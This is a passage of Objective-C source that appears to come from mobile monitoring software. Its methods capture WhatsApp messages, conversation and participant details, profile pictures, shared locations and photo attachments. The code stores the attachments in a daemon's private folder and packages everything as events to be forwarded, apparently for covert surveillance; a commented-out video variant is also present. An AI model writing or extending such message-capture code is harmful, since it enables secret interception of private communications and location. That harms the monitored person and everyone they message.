				userProfilePictureData: (NSData *) aUserProfilePictureData			// user profile picture
						  userLocation: (FxIMGeoTag *) aUserLocation

				 messageRepresentation: (FxIMMessageRepresentation) aMessageRepresentation
							   message: (NSString *) aMessage
							 direction: (FxEventDirection) aDirection				// direction

						conversationID: (NSString *) aConversationID				// conversation id
					  conversationName: (NSString *) aConversationName				// conversation name
			conversationProfilePicture: (NSData *) aConversationProfilePicture		// conversation profile pic

						  participants: (NSArray *) aParticipants														

						   attachments: (NSArray *) aAttachments

						 shareLocation: (FxIMGeoTag *) aSharedLocation {	
	/********************************
	 *			FxIMEvent [ANY]
	 ********************************/
	FxIMEvent *imEvent = [[FxIMEvent alloc] init];
	[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];		
	
	[imEvent setMIMServiceID:kIMServiceIDWhatsApp];					// specific to IM application	
	[imEvent setMServiceID:kIMServiceWhatsApp];						// specific to IM application	
	
	[imEvent setMDirection:(FxEventDirection) aDirection];
	[imEvent setMRepresentationOfMessage:aMessageRepresentation];
	[imEvent setMMessage:aMessage];				
	// -- user
	[imEvent setMUserID:aUserID];
	[imEvent setMUserDisplayName:aUserDisplayName];
	[imEvent setMUserStatusMessage:aUserStatusMessage];
	[imEvent setMUserPicture:aUserProfilePictureData];
	[imEvent setMUserLocation:aUserLocation];		
	// -- conversation
	[imEvent setMConversationID:aConversationID];
	[imEvent setMConversationName:aConversationName];
	[imEvent setMConversationPicture:aConversationProfilePicture];		
	// -- participant
	[imEvent setMParticipants:aParticipants];	
	// -- attachment
	[imEvent setMAttachments:aAttachments];		
	// -- share location
	[imEvent setMShareLocation:aSharedLocation];	
		
	// -- send WhatsApp event ---------------------------------------------------------------------	
	[WhatsAppUtils sendWhatsAppEvent:imEvent];
	[imEvent release];
	imEvent = nil;
}

+ (void) sendImageContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants														

							   photoData: (NSData *) aPhotoData
						   thumbnailData: (NSData *) aThumbnailData {
	/********************************
	 *			FxIMEvent [Image]
	 ********************************/
	NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];
	FxAttachment *attachment	= [WhatsAppUtils createPhotoAttachment:aPhotoData thumbnail: aThumbnailData];		
	NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];	
	[pool drain];
	
	DLog (@"aThumbnailData %d", [aThumbnailData length])
			
	[WhatsAppUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:kIMMessageNone								
										 message:nil										// No message for image
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments
								   shareLocation:nil];					// one photo as an attachment
	[attachments release];
	attachments = nil;		
}


//+ (void) sendVideoContentTypeEventUserID: (NSString *) aUserID						// user id
//						 userDisplayName: (NSString *) aUserDisplayName				// user display name
//					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
//				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture
//
//							   direction: (FxEventDirection) aDirection				// direction
//
//						  conversationID: (NSString *) aConversationID				// conversation id
//						conversationName: (NSString *) aConversationName			// conversation name
//			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic
//
//							participants: (NSArray *) aParticipants	
//							   videoPath: (NSURL *) aVideoPath 
//						   thumbnailData: (NSData *) aThumbnailData {
//	/********************************
//	 *			FxIMEvent [Video]
//	 ********************************/
//	if (aDirection == kEventDirectionOut) {		
//		NSData *videoData			= [[NSData alloc] initWithContentsOfURL:aVideoPath];
//		FxAttachment *attachment	= [WhatsAppUtils createVideoAttachmentForData:videoData 
//																	thumbnailData:aThumbnailData
//																	fileExtension:@"MOV"];
//		[videoData release];
//		videoData = nil;
//		NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];	
//		
//		[WhatsAppUtils sendAnyContentTypeEventUserID:aUserID
//								 userDisplayName:aUserDisplayName 
//							   userStatusMessage:aUserStatusMessage
//						  userProfilePictureData:aUserProfilePictureData 
//									userLocation:nil 
//						   messageRepresentation:kIMMessageNone								
//										 message:nil										// No message for video
//									   direction:aDirection 
//								  conversationID:aConversationID 
//								conversationName:aConversationName 
//					  conversationProfilePicture:aConversationProfilePicture 
//									participants:aParticipants 
//									 attachments:attachments
//								   shareLocation:nil];
//		[attachments release];
//	}
//}

#pragma mark Photo Attachment Utils


+ (FxAttachment *) createPhotoAttachment: (NSData *) aImageData thumbnail: (NSData *) aThumbnailData {
	// -- create path
	NSString* whatsAppAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imWhatsApp/"];
	whatsAppAttachmentPath				= [WhatsAppUtils getOutputPath:whatsAppAttachmentPath extension:@"jpg"];
	DLog (@"attachment %@", whatsAppAttachmentPath)
	
	// -- write image to document file
	if (aImageData) {
		[aImageData writeToFile:whatsAppAttachmentPath atomically:YES];
	}
	
	// -- create FxAttachment
	FxAttachment *attachment = [[FxAttachment alloc] init];
	if (aImageData)
		[attachment setFullPath:whatsAppAttachmentPath];
	else {
		[attachment setFullPath:@"image/jpeg"];			// incoming image that has been downloaded in time
	}
	[attachment setMThumbnail:aThumbnailData];			// even actual image hasn't been downloaded, its thumbnail has been created
	
	return [attachment autorelease];
}


#pragma mark Video Attachment Utils


//+ (FxAttachment *) createVideoAttachmentForData: (NSData *) aData 
//								  thumbnailData: (NSData *) aThumbnailData
//								  fileExtension: (NSString *) aExtension  {
//	// -- create path
//	NSString* whatsAppAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imWhatsApp/"];
//	whatsAppAttachmentPath				= [WhatsAppUtils getOutputPath:whatsAppAttachmentPath extension:aExtension];	
//	DLog (@"attachment %@", whatsAppAttachmentPath)
//	
//	// -- create FxAttachment
//	FxAttachment *attachment = nil;
//	
//	// -- write audio/video to document file
//	if (aData) {
//		attachment = [[FxAttachment alloc] init];
//		[aData writeToFile:whatsAppAttachmentPath atomically:YES];		
//		[attachment setFullPath:whatsAppAttachmentPath];
//		[attachment setMThumbnail:aThumbnailData];
//	}
//	
//	return [attachment autorelease];
//}


#pragma mark General Attachment Utils


// create timestamp of now
+ (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

// get thumbnail path with its extension
+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@im_%@.%@",
							aOutputPathWithoutExtension, 
							formattedDateString, 
							aExtension];
	return [outputPath autorelease];
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
	// delete the attachment files
	if (aAttachmentArray && [aAttachmentArray count] != 0) {
		for (FxAttachment *attachment in aAttachmentArray) {
			NSString *path = [attachment fullPath];
			DLog (@"deleting file: %@", path)
			[[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		}	
	}
}



#pragma mark -
#pragma mark Memory Management


/**
 - Method name: dealloc
 - Purpose:  This method is used to manage memory
 - Argument list and description: No Argument
 - Return type and description: No Return 
 */

- (void) dealloc {
	if(mWhatsAppDB) {
		[mWhatsAppDB close];
		[mWhatsAppDB release];
		mWhatsAppDB = nil;
	}
	if (mAccountInfo) {
		[mAccountInfo release];
		mAccountInfo = nil;
	}
	[super dealloc];	
}
@end
